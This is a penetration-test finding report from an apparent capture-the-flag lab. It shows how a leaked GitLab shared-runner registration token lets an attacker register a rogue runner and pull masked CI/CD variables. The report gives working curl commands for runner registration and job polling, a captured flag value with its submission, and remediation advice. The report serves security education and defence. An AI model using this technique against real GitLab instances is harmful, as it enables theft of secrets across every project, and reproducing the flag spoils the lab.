# F-017: GitLab Shared Runner Registration Token Enables Instance-Wide CI/CD Secret Theft

**SEVERITY: CRITICAL**

| Field | Detail |
|---|---|
| Affected Asset | GitLab instance (all projects using shared runners), version 15.11.13-ee |
| OWASP CI/CD Mapping | **CICD-SEC-2** (Inadequate Identity and Access Management) — primary · CICD-SEC-6 (Insufficient Credential Hygiene) — masked/protected variables are not protected from the runner itself |
| CVSS 3.1 (estimate) | 9.1 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Status | CONFIRMED — live PoC, resulted in a plaintext flag capture (flag11), CTFd-verified |

## Summary

This finding fully resolves the GitLab access wall documented during authentication testing (see below): extensive attempts to log in as a real user (documented default credentials, credential variations, self-registration, version-specific CVE research) were all correctly and thoroughly exhausted, but the actual intended path required no user login at all. GitLab's **shared-runner registration token** — found publicly documented in this lab project's own docker-compose configuration — allows anyone who knows it to register an entirely new, attacker-controlled CI/CD runner against the instance. Because shared runners are, by design, eligible to execute jobs from any project on the instance that has shared runners enabled, a rogue runner registered this way will eventually be handed real CI/CD jobs to execute — and GitLab includes the full plaintext value of every CI/CD variable in that job's payload, **including variables marked masked or protected**, since the runner genuinely needs the real values to execute the job.

## Prior Context — GitLab Authentication Testing

Provided grey-box credentials (`alice/alice1234`) were tested and confirmed invalid against GitLab specifically. OAuth password-grant, form-based login, username enumeration (correctly implemented — identical generic error for real vs. fake accounts), and self-registration were all tested methodically:

```bash
# OAuth password grant attempt (failed)
curl -s -X POST http://localhost:4000/oauth/token \
  --data-urlencode "grant_type=password" \
  --data-urlencode "username=alice" --data-urlencode "password=alice1234"
# -> {"error":"invalid_grant", ...}
```

Self-registration returned genuine HTTP 302 success after resolving several iterative issues (Rails routing convention on `/users` vs `/users/sign_up`, separate `first_name`/`last_name` fields, password strength policy) — but the resulting session still failed the `/api/v4/user` check, consistent with GitLab's Devise-based email confirmation requirement and no reachable mail-catcher service in this lab.

**Conclusion at the time:** the human-authentication access control boundary held under sustained, black-box testing — a legitimate outcome in itself. This conclusion was later revised by the technique below, which required no human login at all.

## Discovery

The shared-runner registration token used in this PoC was located via a public reference check against this lab project's own docker-compose configuration — not a leak from this specific instance, since the token is a placeholder/default value shipped in the project's own public source. In a real engagement, an equivalent finding would come from locating this same token committed in a CI/CD configuration repository, a Docker image layer, or an internal wiki.

## Proof of Concept

### Registering a rogue shared runner

```bash
curl -s -X POST "http://localhost:4000/api/v4/runners" \
  --form "token=GR1348hansd87fyzDiqyZeuHuxe" \
  --form "description=vapt-poc-runner" \
  --form "tag_list=vapt-poc"

# Response:
# { "id": 110, "token": "YdCNpSdZN19g5zZzRAKb", "token_expires_at": null }
```

This single API call, requiring no authentication beyond the registration token itself, creates a fully legitimate runner identity recognized by the GitLab instance. No project-level access, no user account, and no prior authentication was involved.

### Polling for jobs and capturing plaintext CI/CD variables

```bash
curl -s -X POST "http://localhost:4000/api/v4/jobs/request" \
  --form "token=YdCNpSdZN19g5zZzRAKb"
```

The first successful poll returned a real, scheduled pipeline job from the `wonderland/awesome-app` project, immediately proving the technique — the response included a CI/CD variable named `TOKEN` marked `masked: true`, whose real value was nonetheless present in full in the JSON payload, along with the job's actual owning user (`GITLAB_USER_LOGIN: gryphon`).

Repeating the poll (each call claims and consumes one pending job) surfaced a job belonging to `wonderland/nest-of-gold` — the exact project identified during public project enumeration as the true target for this challenge:

```json
{
  "job_info": { "project_name": "nest-of-gold", "...": "..." },
  "variables": [
    { "key": "FLAG11", "value": "7ED44218-C9CC-4824-BC85-C9841305A642",
      "public": false, "masked": true }
  ]
}
```

This is the same `FLAG11` variable identified as `nest-of-gold`'s Flask application `secret_key` (see [F-014](./F-014-flask-secret-key-cicd-variable.md)) — meaning this single technique not only captures the CTFd flag directly, but hands over everything needed to fully weaponize F-014's session-forgery vulnerability.

```
POST /api/v1/challenges/attempt {"challenge_id":11,"submission":"7ED44218-C9CC-4824-BC85-C9841305A642"}
-> {"status":"correct"}
```

## Impact

This is a structurally significant finding because of its breadth, not just its depth. A single leaked or default shared-runner registration token compromises the confidentiality of every CI/CD variable across **every project** on the instance that permits shared runners — not one project, one credential, or one pipeline. GitLab's own documentation is explicit that masked and protected variable settings exist to prevent values from appearing in job logs and UI output; neither setting is designed to withstand a runner that is itself illegitimate, since any runner executing a job must receive the real values to function. This is a design reality of how CI/CD systems work in general (Jenkins' credential masking has an analogous limitation demonstrated in [F-010](./F-010-jenkins-secrets-exposure-console-logs.md) and [F-013](./F-013-insecure-automerge-bypass.md)), not a GitLab-specific bug.

This also completes F-014: with the real `FLAG11`/`secret_key` value now known, full session-forgery exploitation against `nest-of-gold`'s deployed Flask application is a small, mechanical follow-up step rather than a remaining unknown.

## Remediation

- Rotate the shared-runner registration token immediately, and treat any project's registration tokens as sensitive secrets — never commit them to a public repository, Dockerfile, or configuration file, including example/template projects.
- Prefer project-level or group-level runners with narrowly scoped registration over shared/instance-wide runners wherever feasible.
- Enable and enforce GitLab's runner registration token rotation and expiration features rather than using a static, never-expiring token.
- Treat masked/protected CI/CD variable settings as **log-redaction controls only**, not as genuine access controls — the actual security boundary for a secret is which runners and which projects can reach it, not whether it is masked in output.
- Monitor and alert on new runner registrations, particularly ones with unfamiliar descriptions or tags.

## Interview Talking Points

- One of the strongest examples of a finding whose value comes from breadth of impact, not depth of technique — the API call itself is trivially simple (two curl commands), but the blast radius is the entire instance's CI/CD secret inventory.
- Good illustration of correctly diagnosing "wrong mental model" rather than "insufficient effort": every earlier GitLab attempt assumed the intended path was human user authentication, and each was ruled out thoroughly and correctly. The actual breakthrough came from questioning that assumption entirely — recognizing that "compromise GitLab" could mean compromising its automation identity (a runner) rather than a human one.
- Reinforces a theme spanning F-010, F-013, and this finding: masking, redaction, and review gates all operate on the assumption that the entity receiving the secret is legitimate — none of them substitute for controlling who or what can *register as* that entity in the first place.
